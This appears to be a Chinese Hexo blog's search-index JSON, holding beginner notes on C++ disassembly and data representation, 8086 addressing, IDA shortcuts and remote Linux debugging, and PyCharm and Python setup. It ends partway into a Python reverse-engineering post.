编码使用两个字节’\\0’。需要注意的是，不能使用处理ASCII编码的函数对Unicode编码进行处理，因为如果Unicode编码中出现了只占用一字节的字符,就会发生解释错误 在程序中，都会使用一个存放地址的变量来存放字符串中第一个字符的地址，以便查找使用字符串。比如说使用字符型指针char* ，wchar_t* 都来保存字符串首地址。**所以我们要学好C&#x2F;C++语言** &#x2F;哭 1.3.3 字符串的识别字符串的识别也相对简单，同样是结合上下文，查看调用地址处对该地址的处理过程 在通常情况下，OllyDBG 与IDA都会自动识别出程序中的字符串 在使用IDA的过程中，有时会无法识别字符串，可手动修改 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-1.3 字符和字符串&#x2F;image-25.png) 这段数据明显为一个字符串，但是IDA并没有分析出来，这时可以选中将要分析的字符串的首地址，使用快捷键A，便可将从分析地址处到’\\0’解释为字符串。下图为识别后的字符串数据。如果想将已识别的变回未识别的状态，可以选中字符串的地址，使用快捷键D就好了 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-1.3 字符和字符串&#x2F;image-26.png)","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.2浮点数","slug":"C++反汇编与逆向分析技术揭秘-1.2 浮点数","date":"2023-10-31T09:06:53.000Z","updated":"2023-10-31T09:53:46.898Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.2 浮点数/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.2%20%E6%B5%AE%E7%82%B9%E6%95%B0/","excerpt":"","text":"实数数据不可能都是整数，那么就会出现怎么输出小数的问题。在计算机的发展历程中，出现过许多中存储实数的方式，有的现在很少用了不管如何存储，我们都可以划分为定点实数存储方式和浮点实数存储方式这两种。 所谓定点实数，就是约定整数位和小数位的长度。这样的好处是计算的效率高，缺点也显而易见，因为整数部分和小数部分的位数都被固定了，所以存储不灵活。 对应的也有浮点实数的存储方式，简单的理解就是小数点可以移动，是浮动的，不是固定的，这就灵活多了。但这相较于定点实数来说，效率就低得多了。现在主流的实数存储方式就是浮点实数存储方式。但是，在一些条件恶劣的嵌入式开发场合，仍可看到定点实数的存储和使用。 1.2.1 浮点数类型在C&#x2F;C++中，使用浮点方式存储实数，用两种数据类型来保存浮点数: float (单精度)、double (双精度)。float 在内存中占4字节空间，double 在内存中占用8字节空间。由于占用空间大，double可描述的精度更高。这两种数据类型在内存中同样以十六进制方式进行存储，但与整型类型有所不同。整型类型是将十进制转换成二进制保存在内存中，以十六进制方式显示。浮点类型并不是将一个浮点小数直接转换成二进制数保存，而是将浮点小数转换成的二进制码重新编码，再进行存储。C&#x2F;C++的浮点数是有符号的。 注意：在C&#x2F;C++中，将浮点数强制转换为整数时，不会采用数学上四舍五人的方式，而是舍弃掉小数部分，不会进位。下面以C语言为例； 12345678910#include&lt;stdio.h&gt;main()&#123; int num = 127; int a ; float b ; a = num / 10 ; b = (float)num / 10 ; printf(&quot;a=%d,b=%f&quot;,a,b);&#125; 该段代码最后会输出 a&#x3D;12，b&#x3D;12.700000，我们发现 a 的值是12，而不是13，说明并不是四舍五入的原理。所以这就是浮点数强制转换为整数时，直接将小数点后面的全部舍去 另外，我们还需要知道，在使用浮点数之前需要先对浮点寄存器进行初始化，然后才能正常运行，若像下面代码一样则会使程序崩溃 12345678#include&lt;stdio.h&gt;main()&#123; //在未使用到浮点数情况下， //程序输入小数会报错，这是因为没有对浮点寄存器进行初始化 int n = 0; scanf (&quot;%f&quot;，&amp;n) ;&#125; 解决办法是：在使用该浮点数之前定义一个浮点类型的变量即可对浮点寄存器进行初始化 1.2.2 浮点数的编码方式浮点数編码转换采用的是IEEE规定的编码标准，float和double这两种类型数据的转换原理相同，但由于表示的范围不一样，编码方式有些许区别。IEEE 规定的浮点数编码会将一个浮点数转换为二进制数。以科学记数法划分，将浮点数拆分为3部分:符号、指数、尾数。. 1.2.2.1 float类型的IEEE编码float类型在内存中占4字节(32 位)，最高位用于表示符号，在剩余的31位中，从右向左取8位用于表示指数，其余用于表示尾数，如下图所示 ![浮点数的二进制表示说明](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-1.2 浮点数&#x2F;image-20231031171241838.png) 1.2.2.2 double类型的IEEE编码double类型表示的范围更大，精准度也更高，当然占用的空间更多，是float类型所占用空间的两倍。 double类型在内存中占8字节（64位），与float一样的是，最高位也是用于表示符号；不同的是，指数位占11位，剩余的52位用于表示尾数。 而且double类型的IEEE编码转换方式与float类型，除了判断指数符号上有一点点区别之外，其余的都是基本一样的。 1.2.3 基本的浮点数指令之前有讲到，浮点数操作是通过浮点寄存器来实现的，而普通数据类型使用的是通用寄存器，它们分别使用两套不同的指令。 首先，我们要先了解一下什么是栈 栈（我们先来初步了解一下） 栈，存储货物或供旅客住宿的地方，可引申为仓库、中转站，所以引入到计算机领域里，就是指数据暂时存储的地方，所以才有进栈、出栈的说法。栈是限制插入和删除只能在一个位置上进行的线性表。关于栈的稍详细内容请看另一篇文章：初步了解栈❤ 浮点寄存器是通过栈结构来实现的，由ST(0)~ ST(7)共8个栈空间组成，每个浮点寄存器占8字节。每次使用浮点寄存器都是率先使用ST(0)，而不能越过ST(0)直接使用ST(1) （更不用说直接使用更里面的空间了）。浮点寄存器的使用就是压栈、出栈的过程。当ST(0)存在数据时，执行压栈操作后，ST(0)中的数据将装人ST(1)中，如无出栈操作，将顺序地向下压栈，直到将浮点寄存器占满。常用浮点数指令的介绍如表所示，其中，IN表示操作数入栈，OUT表示操作数出栈。 常用浮点数指令表 指令名称使用格式指令功能FLDFLD IN将浮点数IN压入ST(0)中。IN（mem 32/64/80）FILDFILD IN将整数IN压入ST(0)中。IN（mem 32/64/80）FLDZFLDZ将0.0压入ST(0)中FLD1FLD1将1.0压入ST(0)中FSTFST OUTST(0)中的数据以浮点形式存入OUT地址中。OUT(mem 32/64)FSTPFSTP OUT和FST指令一样，但会执行一次出栈操作FISTFIST OUTST(0)数据以整数形式存入OUT地址中。OUT(mem 32/64)FISTPFISTP OUT和FIST指令一样，但会执行一次出栈操作FCOMFCOM IN将IN地址数据与ST(0)进行实数比较，影响对应标记位FTSTFTST比较ST(0)是否为0.0，影响对应标记位FADDFADD IN将IN地址内的数据与ST(0)做加法运算，结果放入ST(0)中FADDPFADDP ST(N).ST将ST(N)中的数据与ST(0)中的数据做加法运算，N为0~7中任意一个，先执行一次出栈操作，然后将相加结果放入ST(0)中保存 其他运算指令和普通指令类似，只需在前面加F即可，如FSUB和FSUBP等。 在使用浮点指令时，都要先利用ST(0)进行运算。当ST(0)中有值时，便会将ST(0)中的数据顺序向下存放到ST(1)中，然后再将数据放入ST(0)中。如果再次操作ST(0)，则会先将ST(1)中的数据放入ST(2)中，然后将ST(0)中的数据放入ST(1)中，最后才将新的数据存放到ST(0)。以此类推，**在8个浮点寄存器都有值的情况下继续向ST(0)中存放数据,这时会丢弃ST(7)中数据信息**。 其实，float类型的浮点数虽然占4字节，但是都以8字节方式进行处理。当浮点数作为参数时，并不能直接压栈。PUSH指令只能传入4字节数据到栈中，这样就有4字节的数据丢失了。这就是为什么使用printf函数以整数形式输出浮点数时会产生错误的原因。printf以整数形式输出时，将对应参数作为4字节数据，按补码方式进行解释；而真正压入的参数时浮点类型时，数据长度其实是8字节，需要用浮点编码方式来解释。如果是将浮点数作为返回值也是一样的，需要传递8字节数据 我们可以自己尝试使用各指令，观察浮点指令的特点的同时，熟悉数据传输类型指令的使用","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.1整型","slug":"C++反汇编与逆向分析技术揭秘-1.1 整型","date":"2023-10-31T09:06:27.000Z","updated":"2023-10-31T09:36:44.641Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.1 整型/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.1%20%E6%95%B4%E5%9E%8B/","excerpt":"","text":"1.1 整型C++提供的整数数据类型有三种: int、long、 short 其中int类型、long类型在内存中占4个字节，short类型在内存中占2个字节；而一个字节可由两个十六进制数表示，一个十六进制数可由四个二进制数表示，每个二进制数表示一位，那么一个字节就在内存中占8位 在C++中，整数类型又可以分为有符号型与无符号型两种。有符号整数可用来表示负数，而无符号整数只能是正数，它们在数据的取值范围上也有区别 1.1.1 无符号整数在内存中，无符号整数的所有位都用来表示数值。以无符号整型数据unsigned int为例，而我们知道，此类型（int型）的变量在内存中占4字节，由8个十六进制数组成，那么其取值范围用十六进制表示就是0x00000000 ~ 0xFFFFFFFF,如果转换为十进制数，则表示范围就是0 ~ 4294967295。 需要注意的是，当无符号整型不足32位时，用0来填充剩余高位，直到占满4字节内存空间为止。例如，数字7对应的二进制数为111，只占了3位，按4字节大小保存，剩余29个高位将用0填充，填充后结果为: 00000000000000000000000000000101 ;转换成十六进制数就是0x00000005。这种存放方式称之为”小尾方式”，”小尾方式”存放是以字节为单位，按照数据类型长度，高数据位对高地址，低数据位对低地址。当然，也有”大尾方式”，它则与”小尾方式”相反。 我们知道，因为无符号整数并不存在正负之分，都是正数，所以无符号整数在内存中都是以真值的形式存放的，每一位都可以参与数据表达。无符号整数可表示的正数范围是补码的一倍。 1.1.2 有符号整数有符号整数中用来表示符号的是最高位一符号位。 最高位为0表示正数，最高位为1表示负数，有符号整数在内存中同样占4字节，但由于最高位为符号位，不能用来表示数值，因此有符号整数中用来表示符号的是最高位一符号位，即最高位为0表示正数，最高位为1表示负数。 有符号整数在内存中同样占4字节，但由于最高位为符号位，不能用来表示数值，因此有符号整数的取值范围要比无符号整数取值范围少1位，即0x80000000 ~ 0x7FFFFFFF，如果转换为十进制数，则其表示范围为-2 147 483 648 ~ 2 147 483 647。在有符号整数中，正数的表示区间为: 0x0000000 ~ 0x7FFFFFF ;负数的表示区间为:0x80000000 ~ 0xFFFFFFFF. 我们要知道，计算机是只会进行加法运算的，所以所有我们输入的减法运算，其实都要转换为加法运算，例如1 - 3 就会是 1 + ( - 3 )。 另外，我们还需要知道，负数在内存中都是以补码形式存放的，补码的规则是用0减去这个数的绝对值，也可以简单地表达为对这个数值取反加1。例如，对于-3，可以表达为0 - 3。为了计算方便，人们也常用取反加一的方式来求得补码。本章的最后会介绍这两种计算方法的原理。值得一提的是，对于4个字节的补码，0x80000000所表达的意义可以是负数0，也可以是0x80000001减去1。然而，对于0来说，它的正负值是相等的，没有必要还来个负数0，因此，也就把这个值的意义规定为0x00000001减去1,这样0x80000000也就成为4字节负数的最小值了。这也是为什么有符号整数的取值范围中，负数区间总是比正数区间多一个最小值的原因。 所以，我们可以通过查看数据表示为十六进制数时的最高位来判断该数据的正负，最高位小于8则为正数，大于8则为负数（另外，如果是负数，则需转换为真值，才能得到对应负数的数值） 对于1.1.2 有符号整数中补码的运算规则，有兴趣的可以继续看完。 我们已经知道，负数在内存中都是以补码形式存放的，我们可以用0减去这个数的绝对值，也可以表达为对这个数值取反加1。例如，对于-3，可以表达为0-3，而0xFFFFFFD+3等于0 (进位丢失),所以-3的补码也就是0xFFFFFFD了。相应地，0xFFFFFFD 作为一个补码，最高位为1,视为负数，转换回真值同样也可以用0-0xFFFFFFD的方式，于是得到-3。为了计算方便，人们也常用取反加一的方式来求得补码，因为对于任何4字节的数值x，都有x+x(反)&#x3D;0xFFFFFFF,于是x+x(反)+1&#x3D;0,接下来就可以推导出0-x&#x3D;x(反)+1了。 如设有符号数x, y,求x-y的值，我们可以推导出x-y&#x3D;x+(0-‘y’)，根据补码的规则，当y为负数的时候，0-‘y’等价于y的补码。对于y的补码，我们记为y(补),所以x-y&#x3D;x+y (补)。例如，(3-2)可会转换成(3+ (-2))，运算过程为: 3的十六进制原码0x00000003加上-2的十六进制补码0xFFFFFFFE，从而得到0x100000001。由于存储范围为4字节大小，两数相加后产生了进位，超出了存储范围，超出的1将被舍弃。进位被舍弃后，结果为0x00000001。","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"汇编学习-2.4 物理地址","slug":"汇编学习-2.4 物理地址","date":"2023-10-31T03:56:27.000Z","updated":"2024-01-25T13:04:59.895Z","comments":true,"path":"2023/10/31/汇编学习-2.4 物理地址/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2.4%20%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/","excerpt":"","text":"汇编学习-2.4 物理地址CPU 访问内存单元时，要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有惟一的地址，我们将这个惟一的地址称为物理地址 CPU 通过地址总线送入存储器的必须是一个内存单元的物理地址，在 CPU 向地址总线上发出物理地址之前，必须在内部先形成这个物理地址。不同的 CPU 可以有不同的形成物理地址的方式 我们要研究的是 8086CPU，我们知道 8086CPU 的上一代等是 8 位机，而 8086CPU 是 16 位机，也可以说是 16 位结构的 CPU，现在我们先来了解一下什么是 16 位结构的 CPU 简单的， 16 位结构讲的是 CPU 具有以下几个结构特性： 运算器一次最多可以处理 16 位的数据 寄存器的最大宽度为 16 位 寄存器与运算器之间的通路为 16 位 这也就是说，16 位结构的 CPU 能够一次性处理、传输、暂时存储的信息的最大长度是 16 位的（内存单元的地址在送上地址总线之前，必须在 CPU 中处理、传输、暂时存放） 在学习 8086CPU 是怎么给出物理地址之前，我们先来梳理一下 8086CPU： 8086CPU 有 20 位地址总线，可以传送 20 位地址，达到 1 mb 的寻址能力；又是 16 位结构，在内部一次性处理、传输、暂时存储的地址为 16 位，从 8086CPU 内部结构来看，如果将地址从内部简单的发出，那么它只能送出 16 位的地址，表现出的寻址能力只有 64 kb 而 8086CPU 采用一种在内部用两个 16 位地址合成的方法来形成一个 20 位的物理地址 当 CPU 要读取内存时： CPU 中的相关部件提供两个 16 位的地址，一个称为段地址，另一个称为偏移地址 段地址和偏移地址通过内部总线被送入一个称为地址加法器的部件 地址加法器将两个 16 位地址合成为一个 20 位的物理地址 地址加法器通过内部总线将 20 位物理地址送上地址总线 20 位物理地址被地址总线传送到存储器 地址加法器采用 物理地址&#x3D;段地址×16+偏移地址 的方法用段地址和偏移地址合成物理地址（其中的 16 是十进制数）下图是一个例子： ![](&#x2F;images&#x2F;汇编学习-2.4 物理地址&#x2F;image.png) 由 段地址 × 16 引发的讨论 “段地址 × 16” 有一个更为常用的说法是左移 4 位（这个 4 位指的是二进制的 4 位，因为计算机中的所有信息都是以二进制的形式存储的，段地址当然也不例外） 我们来看一个例子：一个数据为 2h，二进制形式为 10b，对其进行左移位运算： 左移位数二进制十六进制十进制010b2h21100b4h421000b8h8310000b10h164100000b20h32_观察上面位移次数和各种形式数据的关系，我们可以发现啊：_ 一个数据的二进制形式左移 1 位相当于该数据乘以 2 一个数据的二进制形式左移 N 位相当于该数据乘以 2N 地址加法器如何完成 段地址 × 16 的运算？就是将以二进制形式存放的段地址左移 4 位 进一步思考，我们可以看出：一个数据的十六进制数形式左移 1 位，相当于乘以 16；一个数据的十进制形式左移 1 位，相当于乘以 10；一个 X 进制的数据左移 1 位，相当于乘以 X","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"}],"tags":[]},{"title":"ida-vmware_linux动态调试","slug":"ida-vmware_linux动态调试","date":"2023-10-27T17:35:42.000Z","updated":"2024-03-08T06:17:51.219Z","comments":true,"path":"2023/10/28/ida-vmware_linux动态调试/","link":"","permalink":"http://example.com/2023/10/28/ida-vmware_linux%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","excerpt":"","text":"ida-vmware_linux动态调试查看虚拟机ip使用命令 1ifconfig 注意：如果看不到ip，可能是虚拟机网络问题 确保windows能连上虚拟机打开cmd，输入命令 1ping your_ip 导入server在 IDA\\dbgsrv 文件夹下找到以下两个文件 复制到 linux 里，并在终端尝试运行，下面这样就是成功的了 可能出现的报错权限不够 使用命令 12sudo chmod 777 文件名 #普通用户下chmod 777 文件名 #管理员用户下 ida设置linux dbg 设置参数，更改Hostname为linux ip，Application和Input flie为linux内文件的地址，Directory为linux内文件所在的目录（可以在终端中使用命令pwd查看当前目录地址） 进行动态调试将需要调试的程序复制到Linux内 保持linux上linux_server或linux_server64成功运行（32位程序用linux_server、64位用linux_server64），ida内启动调试","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"ida常用快捷键","slug":"ida几种常用快捷键","date":"2023-10-27T16:35:42.000Z","updated":"2024-02-16T03:26:54.416Z","comments":true,"path":"2023/10/28/ida几种常用快捷键/","link":"","permalink":"http://example.com/2023/10/28/ida%E5%87%A0%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/","excerpt":"","text":"ida 几种常用快捷键ida 是反汇编程序 ，反汇编程序是一种软件，用于将机器代码转换为人类可读的格式，称为汇编语言。而且 ida 是用作静态分析的，ida 是神器，尤其是你一个 F5 能看到伪代码，然后修改修改贴到 C 程序里直接能编译运行的时候，你就会深刻感受到 IDA 的强大。 IDA 里有很多强大的功能，其中很多功能我们可以用快捷键来快速实现 1. F5 与 TabF5 键和 Tab 键的功能是基本一样的，都可以用来反编译，也就是查看伪代码，一般我们用 IDA 打开一个程序是下面这个样子的： 而这种形式我们看不懂，或者不太能看懂，那么我们就可以用 IDA 强大的功能查看它的伪代码，那我们要怎样可以快速查看呢，就是 F5，我们按 F5 就能进入下面这个窗口，这样是不是就亲切多了 当然，按 tab 键也能实现上面的功能（ tab 键就是大写锁定上面那个），不过 tab 键相较于 F5 多一个小功能，那就是返回原本的形式，我们可以自己打开一个试试看 2. Shift + F12shift + f12 是一个重要的功能，它的功能就是把所有的字符串都整理出来 像上图这样，我们就可以看到所有的字符串信息，我们可以选中一个 双击 这样我们就能看到这段字符串的一些有用信息 善用 shift + f12 是很重要的，这对我们找到我们想要的信息有很大的帮助 3. Ctrl + XCtrl + X 也是一个非常重要的功能，它可以帮我们找到一段信息在哪里被调用了，比如说上面讲 Shift + f12 的时候，我们找到了”You are correct!”所在的位置，那么哪里调用了它呢，这时候 Ctrl + X 的作用就体现出来了，Ctrl + X 也被称为 交叉引用 ，我们选中字符串 “You are correct!” 然后使用 Ctrl + X， 这样就会告诉你都有哪些地方调用了这段字符串，这里显示只有一处调用了它，我们可以双击那个蓝条条，直接进入调用它的地方 然后我们到了这里，这个时候我们就用 F5 或者 tab 键查看伪代码 这样，我们就知道我们找的这段字符串在哪里出现的了 4. EscEsc 我们都很熟悉，就是退出、退回，所以当我们点进一个函数的时候，查找了一个数据后，用 esc 返回上一层，比如进来了这个_main()函数 我们点 esc 就能回去了 5. Shift + EShift + E 可以用来提取数据，比如说下图一个叫 aZyxwvutsrqponm 的 它的数据是后面绿色的部分，但是，我们发现，这串绿色的字中间有参杂着不是数据的东西（注意看单引号从哪开始，在哪结束），而且有些数据没有放在同一行，我们很容易弄混，这个时候 Shift + E 就有大作用了 我们选中 aZyxwvutsrqponm，然后使用 shift + e ，这个时候它就显示了 aZyxwvutsrqponm 的数据 我们还可以选择输出的形式，比如上图就是 16 进制的形式，我们还可以把它弄成 10 进制的 （还有字符形式等形式） 当然我们还可以导出这段数据，点击下面的 Export 就可以了，这时它就会生成一个文本文件到你的程序的目录下 6. &#x2F; (添加注释)我们在分析的时候，添加注释是个好习惯，这能够让我们保持清晰的思路，而且不会遗忘之前看懂的东西，那么怎么直接在 IDA 上添加注释呢？ 我们选中一行，直接点 左斜杠 &#x2F; 就好 当然，直接 右键 → Edit comment… 也是可以添加注释的 7. \\ (隐藏类型描述)很多时候，在反编译后伪代码的界面中会有变量和函数的类型描述，当这些描述太多的时候，会影响我们对代码的判断，这个时候我们可以使用 右斜杠 \\ 来隐藏掉这些描述 不过有的时候，这些描述是必要的，我们可以再使用一次 右斜杠 \\ 来显示这些描述 当然，我们也可以通过 右键 → Hide casts &#x2F; Show casts 来隐藏或者显示描述 8. Alt + Talt + t 可以用来搜索字符串，我们可以在 ida 里试试， 使用 alt + t 后会出现上面的窗口，然后我们在 String 那里填你想要输入的字符串，比如我想找 right 在哪 这样 ida 就会帮你找到 right 的位置 9. Alt + Lalt + l 的作用就是标记，可以自己在 ida 里尝试一下， 选择一处然后按 alt + l ，可以明显看到变化 10. Alt + Malt + m 和之前讲的添加注释很像，我们在 ida 里试试， 选中一行，然后按 alt + m， 就会出现下面这个窗口，然后我们先随便输入一个东西， 点击 OK 后，我们可以看到操作后的那一行变了色， 我们把鼠标放过去，就可以看到我们刚刚输入的东西 11. N 键n 键的作用是重命名，很简单，就是 ida 可以帮你把一个变量的名字换成你输入的名称，而且每处调用该变量的地方都会帮你修改，我们来试试， 我们选中一个变量，可以看到，黄底的都是这个变量，我们按 N 键， 这样就出现了下面那样的窗口，我们可以重命名这个变量了， 我们把它改成 input， 我们可以看到，原本叫 byte_4212C0 的都改成了我们输入的 input 12. G 键g 键可以跳转到我们想要去的地址处，比如我们记住了下面那处地址后，到了其他地址后想回来，就可以用 g 键，输入，然后跳转，就回来了 13. A 键a 键的作用呢，不好说，不过看了实例后就会明白了， 像下图的这样明显是字符串的，这种形式我们不好看，那么我们选中首地址后按一下 a 键后会怎么样呢？ 瞧，它就变成了这样，是不是好看多了 14. Ctrl + Z说了这么多操作，那么如果不小心用错了怎么办，没事，ida 还有撤回操作 没错，就是 ctrl + z ，快去试一试吧！ 15. 其它以上 14 种是我最常用的，还有其他的快捷键没有介绍，有兴趣的可以查找相关信息了解一下","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-10-27T14:43:22.000Z","updated":"2023-10-31T09:58:45.861Z","comments":true,"path":"2023/10/27/hello-world/","link":"","permalink":"http://example.com/2023/10/27/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"Start","slug":"Start","permalink":"http://example.com/categories/Start/"}],"tags":[]},{"title":"pycharm安装使用","slug":"Pycharm安装使用","date":"2023-10-07T09:23:07.000Z","updated":"2024-01-25T13:05:45.875Z","comments":true,"path":"2023/10/07/Pycharm安装使用/","link":"","permalink":"http://example.com/2023/10/07/Pycharm%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Pycharm安装使用安装官网下载：https://www.jetbrains.com/pycharm/download/#section=windows 有专业版和社区版两种，专业版需要付费，社区版免费 启动安装程序，更改安装路径，Installation Options可以全都选上，然后直接安装 配置中文file -&gt; setting -&gt; plugins ，搜索 Chinese，选择 Simplified Chinese 下载安装，然后重启 pycharm 即可 添加解释器英文：file -&gt; setting -&gt; Project: 项目名-&gt;Project Interpreter 中文：文件 -&gt; 设置 -&gt; 项目：项目名 -&gt; Python 解释器 点击右上角添加解释器 -&gt; 添加本地解释器 选择现有，然后找到python原生文件 选择解释器","categories":[{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"Windows下更换python版本","slug":"Windows下更换python版本","date":"2023-09-22T10:10:14.000Z","updated":"2024-01-23T10:12:03.805Z","comments":true,"path":"2023/09/22/Windows下更换python版本/","link":"","permalink":"http://example.com/2023/09/22/Windows%E4%B8%8B%E6%9B%B4%E6%8D%A2python%E7%89%88%E6%9C%AC/","excerpt":"","text":"Windows下更换python版本更改环境变量有两种方法打开系统变量窗口 搜索栏搜索环境变量 我的电脑 -&gt; 属性 -&gt; 高级系统设置 打开后点击 环境变量 选择系统变量中的 Path 变量 将目标版本的两个变量移至所有python环境变量最前面，点击确定 在cmd中可以检验是否更改成功","categories":[{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"align对齐伪指令","slug":"align对齐伪指令","date":"2023-05-26T08:03:07.000Z","updated":"2024-03-11T00:22:27.672Z","comments":true,"path":"2023/05/26/align对齐伪指令/","link":"","permalink":"http://example.com/2023/05/26/align%E5%AF%B9%E9%BD%90%E4%BC%AA%E6%8C%87%E4%BB%A4/","excerpt":"","text":"align对齐伪指令原理对齐伪指令ALIGN对齐伪指令格式： ALIGN Num 其中：Num必须是2的幂，如：2、4、8和16等。 伪指令的作用是：告诉汇编程序，本伪指令下面的内存变量必须从下一个能被Num整除的地址开始分配。 如果下一个地址正好能被Num整除，那么，该伪指令不起作用，否则，汇编程序将空出若干个字节，直到下一个地址能被Num整除为止。 实例 这里number上面有个align 40h，其中40h也就是十进制的64，所以number里的元素其实是9、0Ah、0Fh、17h……","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"Python逆向入门","slug":"Python逆向入门","date":"2023-05-25T00:04:14.000Z","updated":"2024-01-26T13:06:05.856Z","comments":true,"path":"2023/05/25/Python逆向入门/","link":"","permalink":"http://example.com/2023/05/25/Python%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/","excerpt":"","text":"Python逆向入门pyinstxtractor.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218